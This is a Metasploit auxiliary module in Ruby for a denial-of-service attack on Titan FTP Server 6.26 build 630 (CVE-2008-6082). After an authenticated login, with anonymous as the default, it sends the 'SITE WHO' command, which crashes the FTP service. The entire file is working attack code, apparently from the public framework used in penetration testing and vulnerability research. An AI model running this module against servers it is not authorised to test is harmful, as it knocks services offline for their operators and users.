##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Titan FTP Server 6.26.630 SITE WHO DoS',
        'Description' => %q{
          The Titan FTP server v6.26 build 630 can be DoS'd by
          issuing "SITE WHO".  You need a valid login so you
          can send this command.
        },
        'Author' => 'kris katterjohn',
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2008-6082'],
          [ 'OSVDB', '49177'],
          [ 'EDB', '6753']
        ],
        'DisclosureDate' => '2008-10-14',
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ], fallbacks: ['USERNAME']),
      OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ], fallbacks: ['PASSWORD'])
    ])
  end

  def run
    return unless connect_login

    print_status('Sending command...')
    raw_send("SITE WHO\r\n")
    select(nil, nil, nil, 1)
    disconnect
  end
end
